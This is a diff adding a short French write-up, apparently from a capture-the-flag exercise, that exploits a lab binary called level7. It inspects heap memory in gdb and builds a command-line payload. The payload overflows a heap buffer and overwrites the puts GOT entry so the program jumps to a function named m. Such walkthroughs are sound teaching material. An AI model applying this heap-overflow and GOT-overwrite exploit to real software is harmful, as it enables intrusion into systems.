@@ -1,0 +1,42 @@
+# Apres test, on observe que le program segfault avec un argv[1] > 20.
+# On va donc regarder pourquoi avec gdb.
+
+gdb --args ./level7 `python -c 'print("A" * 20)'` BBBB
+> b *0x80485c2 (apres le 2eme strcpy)
+> r
+> x/32x 0x0804a008 (adresse du premier malloc)
+
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+0x804a028:      0x41414141      0x0804a000      0x00000000      0x00000011
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
+
+# On observe une adresse 0x0804a000 apres les 0x41 qui est pile apres les 20 caracteres.
+# On va voir ce qu'il y a.
+
+> x/32x 0x0804a000
+
+0x804a000:      0x43434343      0x00000000      0x00000001      0x0804a018
+0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
+0x804a020:      0x41414141      0x41414141      0x41414141      0x0804a000
+0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
+
+# On voit notre argv[2], il semblerai donc que le strcpy a etait effectue a l'adresse qui etait stocke dans le 3eme malloc
+
+# On va donc essaye de changer cette adresse pour changer notre .got.plt du 'puts'  pour rediriger vers la fonction m
+# On recupere les adresses
+
+0x08049928 = adresse du pointer
+0x08048406 = adresse a changer
+0x080484f4 = adresse m
+
+# On creer la ligne
+
+./level7 `python -c 'print("A" * 20 + "\x28\x99\x04\x08")'` `python -c 'print("\xf4\x84\x04\x08")'`
+
+# DATA
+
+malloc 1 = 0x0804a008
+malloc 2 = 0x0804a018
+malloc 3 = 0x0804a028
+malloc 4 = 0x0804a038
